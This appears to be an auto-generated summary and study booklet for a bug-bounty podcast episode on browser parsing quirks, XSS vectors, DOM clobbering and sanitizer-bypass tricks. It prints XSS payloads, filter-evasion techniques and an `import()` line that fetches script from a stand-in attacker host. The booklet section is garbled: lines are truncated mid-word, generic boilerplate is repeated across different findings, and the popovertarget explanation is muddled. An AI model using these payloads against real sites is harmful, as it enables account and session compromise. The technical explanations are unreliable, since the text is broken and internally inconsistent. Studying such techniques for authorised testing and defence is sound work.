---
title: "Client-side Quirks & Browser Hacks"
episode: 26
---


# Episode 26 Client-side Quirks & Browser Hacks

**Guests/Hosts:** Justin Gardner, Joel Margolis  
**Date:** 2023-07-06 | **Duration:** 1:33:20

### TL;DR
- Deep dive into HTML parsing quirks, XSS vectors, CSS injection, DOM clobbering
- New popover API in Chrome enables XSS via `popovertarget` attribute (discovered by PortSwigger Research)
- Math ML tag in Firefox makes any element clickable (JS URI in href)
- HTML comment quirks: `<` + `?` (question mark) creates a comment without `!`
- JS `import()` — dynamic module import works in the browser, useful for short XSS payloads

### Key Takeaways
- `popovertarget="=" + `<input id="= ...">` can create double-equals HTML attribute bypass for filter evasion
- `<math>` tag in Firefox enables XSS via any element — `<math><a href="javascript:alert(1)">click</a>`
- `<?` as HTML comment opener — bypasses sanitizers that block `<!--`
- `import()` in browser — load external JS module on demand; useful when `<script src>` is blocked (CSP dependent)
- DOM clobbering with multiple elements having the same ID creates a DOM collection; you can then access sub-attributes via `.name` on the second element
- Meta tag `http-equiv="refresh"` works for redirect with HTML injection even in body; `http-equiv="content-type"` can force encoding changes

### Bugs and Findings

#### popovertarget XSS — XSS (HTML injection)
- **Target/context:** Chrome browser (any tag); discovered by PortSwigger Research
- **Root cause:** Custom attribute `popovertarget` on a `<button>` targeting an `<input>` ID. The input can be hidden/disabled. Using double-equals (`popovertarget=="...`) tricks parsers.
- **Technique / how found:** PortSwigger Research Chrome feature analysis
- **Exploitation steps:**
  1. `<button popovertarget="="><input id="="><...>` with injection in ID
  2. User clicks the button → triggers element with the ID
- **Key technical details:** `popovertarget` is a new Chrome attribute; `=` as attribute value creates parsing confusion; element can be `hidden` or `disabled`
- **Impact / severity / bounty:** One-click XSS; browser-dependent

#### Math ML Firefox XSS — XSS
- **Target/context:** Firefox browser
- **Root cause:** `<math>` element changes parsing context, making any child element interactive with `href="javascript:..."`
- **Key technical details:** `<math><a href="javascript:alert(1)">click</a>` — works in Firefox only
- **Impact / severity / bounty:** One-click XSS, Firefox-specific (~2.5% browser share)

### Techniques and Primitives
- **Double-equals attribute bypass** — `attr=="value"`: first `=` defines the attribute, second `=` is the value; the following double-quote is inside the value, confusing regex-based filters
- **JS `import()` for XSS payloads** — `import('//attacker.com/x.js')` loads an external ES module; shorter than `<script src>` for proving arbitrary JS execution
- **DOM clobbering with multiple elements** — Two `<a>` tags with same ID, one with `name="url"` → `window.targetId.url` returns the `.href` via `.toString()` on the HTMLAnchorElement
- **Base tag in body** — Contrary to spec, `<base>` works in `<body>`, changing relative URL resolution for all subsequent elements

### Tooling and Resources
- PortSwigger Research Twitter account
- Gareth Heyes' "JavaScript for Hackers" book
- PortSwigger Web Security Academy (DOM clobbering, prototype pollution sections)
- JS.Sluice (TomNomNom's JS URL/path/secret extractor)
- CSP Evaluator (Google) — evaluates CSP policies

### Suggestions and Advices from Hunter
- "If you see `<` + `?` in HTML, that creates a comment — useful for bypassing sanitizers that don't expect it."
- "Don't forget about the magical `<math>` element, which can make any HTML element clickable in Firefox."
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
Deep dive into HTML parsing quirks, XSS vectors, CSS injection, DOM clobbering

#### 2. What you should learn
- Understand **`popovertarget="=" + `<input id="= ...">` can create double-equals html attribute bypass for filter evasion**
- Understand **`<math>` tag in firefox enables xss via any element — `<math><a href="javascript:alert(1)">click</a>`**
- Understand **`<?` as html comment opener — bypasses sanitizers that block `<!--`**
- Understand **`import()` in browser — load external js module on demand; useful when `<script src>` is blocked (csp dependent)**
- Understand **dom clobbering with multiple elements having the same id creates a dom collection; you can then access sub-attributes via `.name` on the second element**

#### 3. Core concepts explained
**popovertarget XSS — XSS (HTML injection)**
- **What it is:** Cross-Site Scripting — injecting malicious JavaScript that runs in a victim's browser session, allowing session theft, phishing, or further attacks.
- **Why it matters:** XSS remains one of the most common and impactful web vulnerabilities. Stored XSS can affect every user who views the page.
- **Common mistake:** Focusing only on reflected XSS and missing stored XSS in profile fields, file uploads, or message boards.

**Math ML Firefox XSS — XSS**
- **What it is:** Cross-Site Scripting — injecting malicious JavaScript that runs in a victim's browser session, allowing session theft, phishing, or further attacks.
- **Why it matters:** XSS remains one of the most common and impactful web vulnerabilities. Stored XSS can affect every user who views the page.
- **Common mistake:** Focusing only on reflected XSS and missing stored XSS in profile fields, file uploads, or message boards.

**Double-equals attribute bypass**
- `attr=="value"`: first `=` defines the attribute, second `=` is the value; the following double-quote is inside the value, confusing regex-based filters

**JS `import()` for XSS payloads**
- `import('//attacker.com/x.js')` loads an external ES module; shorter than `<script src>` for proving arbitrary JS execution

**DOM clobbering with multiple elements**
- Two `<a>` tags with same ID, one with `name="url"` → `window.targetId.url` returns the `.href` via `.toString()` on the HTMLAnchorElement


#### 4. Techniques and tactics
**Double-equals attribute bypass**
- **What it is:** `attr=="value"`: first `=` defines the attribute, second `=` is the value; the following double-quote is inside the value, confusing regex-based filters
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**JS `import()` for XSS payloads**
- **What it is:** `import('//attacker.com/x.js')` loads an external ES module; shorter than `<script src>` for proving arbitrary JS execution
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**DOM clobbering with multiple elements**
- **What it is:** Two `<a>` tags with same ID, one with `name="url"` → `window.targetId.url` returns the `.href` via `.toString()` on the HTMLAnchorElement
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Base tag in body**
- **What it is:** Contrary to spec, `<base>` works in `<body>`, changing relative URL resolution for all subsequent elements
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.


#### 5. Good Quotes
- *"If you see `<` + `?` in HTML, that creates a comment"* — **useful for bypassing sanitizers that don't expect it.**
- *"Don't forget about the magical `<math>` element, which can make any HTML element clickable in Firefox."*

#### 6. Mental models
- **If you see `<` + `?` in HTML, that creates a comment — usefu** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Don't forget about the magical `<math>` element, which can m** — This mindset helps you find bugs others miss by approaching the problem from a different angle.

#### 7. Real-world application
- **Try this:** `popovertarget="=" + `<input id="= ...">` can create double-equals HTML attribute bypass for filter evasion
- **Try this:** `<math>` tag in Firefox enables XSS via any element — `<math><a href="javascript:alert(1)">click</a>`
- **Try this:** `<?` as HTML comment opener — bypasses sanitizers that block `<!--`
- **Try this:** `import()` in browser — load external JS module on demand; useful when `<script src>` is blocked (CSP dependent)

#### 8. Red flags and pitfalls
- **Giving up too early** — Many bugs require creative pivoting when initial exploitation paths are blocked
- **Ignoring blind vulnerabilities** — Blind SSRF, blind XSS, and timing-based attacks can be just as impactful as visible ones
- **Missing the forest for the trees** — Don't get tunnel vision on one vulnerability class; step back and consider the full attack surface

#### 9. Vocabulary
- **XSS** — Cross-Site Scripting — injecting JavaScript into web pages viewed by other users
- **RCE** — Remote Code Execution — running arbitrary code on a target server
- **API** — Application Programming Interface — structured endpoints for data exchange

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in popovertarget XSS — XSS (HTML injection)?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
3. **Reasoning:** Why is this technique effective against the target? What makes it work?
4. **Application:** How would you adapt this technique if the target had a WAF blocking obvious payloads?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.

#### 11. The practical takeaway
1. **Deep dive into HTML parsing quirks, XSS vectors, CSS injection, DOM clobbering**
2. **`popovertarget="=" + `<input id="= ...">` can create double-equals HTML attribut**
3. **`<math>` tag in Firefox enables XSS via any element — `<math><a href="javascript**
